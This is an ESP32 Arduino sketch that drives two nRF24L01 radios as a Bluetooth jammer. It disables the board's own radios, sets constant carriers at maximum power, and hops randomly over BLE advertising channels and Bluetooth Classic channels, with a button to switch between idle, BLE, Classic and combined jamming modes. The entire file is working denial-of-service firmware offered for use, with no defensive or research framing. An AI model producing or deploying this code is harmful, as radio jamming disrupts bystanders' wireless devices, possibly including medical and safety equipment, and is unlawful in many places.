#include "RF24.h"
#include <SPI.h>
#include <ezButton.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Hardware Configuration
constexpr int BUTTON_PIN = 33; 
constexpr int SPI_SPEED = 16000000;

SPIClass *spiVSPI = nullptr;
SPIClass *spiHSPI = nullptr;

// RF24 radio(CE, CSN);
RF24 radioVSPI(15, 5, SPI_SPEED);
RF24 radioHSPI(22, 21, SPI_SPEED);

// Frequency Tables
int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

int currentMode = 0;
ezButton modeButton(BUTTON_PIN);

// Function Prototypes
void configureRadio(RF24 &radio, int channel, SPIClass *spi);
void handleModeChange();
void executeMode();
void jamBLE();
void jamBluetooth();
void jamAll();

void setup() {
    Serial.begin(115200);
    
    // Completely disable internal ESP32 wireless to prevent self-interference
    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    
    // Set up button with internal pull-up (Connect button between Pin 33 and GND)
    pinMode(BUTTON_PIN, INPUT_PULLUP);
    modeButton.setDebounceTime(100);
    
    // Initialize VSPI Cluster (Radio 1)
    spiVSPI = new SPIClass(VSPI);
    spiVSPI->begin();
    //spiVSPI->begin(18, 19, 23, 5); // SCK, MISO, MOSI, SS
    configureRadio(radioVSPI, ble_channels[0], spiVSPI);
    
    // Initialize HSPI Cluster (Radio 2)
    spiHSPI = new SPIClass(HSPI);
    spiHSPI->begin();
    //spiHSPI->begin(14, 12, 13, 15); // SCK, MISO, MOSI, SS
    configureRadio(radioHSPI, bluetooth_channels[0], spiHSPI);

    Serial.println("\n--- DUAL NRF24 JAMMER READY ---");
    Serial.println("Mode 0: IDLE (No Jamming)");
}

void loop() {
    modeButton.loop();
    if (modeButton.isPressed()) {
        handleModeChange();
    }
    executeMode();
}

void handleModeChange() {
    currentMode = (currentMode + 1) % 4;
    Serial.print(">>> Switched to Mode: ");
    Serial.println(currentMode);
    
    if (currentMode == 0) Serial.println("Status: IDLE");
    if (currentMode == 1) Serial.println("Status: JAMMING BLE");
    if (currentMode == 2) Serial.println("Status: JAMMING BLUETOOTH CLASSIC");
    if (currentMode == 3) Serial.println("Status: JAMMING ALL");
}

void executeMode() {
    switch (currentMode) {
        case 0: // Idle
            delay(100);
            break;
        case 1:
            jamBLE();
            break;
        case 2:
            jamBluetooth();
            break;
        case 3:
            jamAll();
            break;
    }
}

void configureRadio(RF24 &radio, int channel, SPIClass *spi) {
    if (radio.begin(spi)) {
        Serial.println("Radio found and setup!");
        radio.setAutoAck(false);
        radio.stopListening();
        radio.setRetries(0, 0);
        radio.setPALevel(RF24_PA_MAX, true);
        radio.setDataRate(RF24_2MBPS);
        radio.setCRCLength(RF24_CRC_DISABLED);
        radio.startConstCarrier(RF24_PA_HIGH, channel);
    } else {
        Serial.println("CRITICAL: Radio Hardware Not Found!");
    }
}

void jamBLE() {
    int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
    int channel = ble_channels[randomIndex];
    radioVSPI.setChannel(channel);
    radioHSPI.setChannel(channel);
}

void jamBluetooth() {
    int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
    int channel = bluetooth_channels[randomIndex];
    radioVSPI.setChannel(channel);
    radioHSPI.setChannel(channel);
}

void jamAll() {
    // Rapidly switch between BLE and BT tables
    if (random(0, 2)) {
        jamBluetooth();        
    } else {
        jamBLE();
    }
}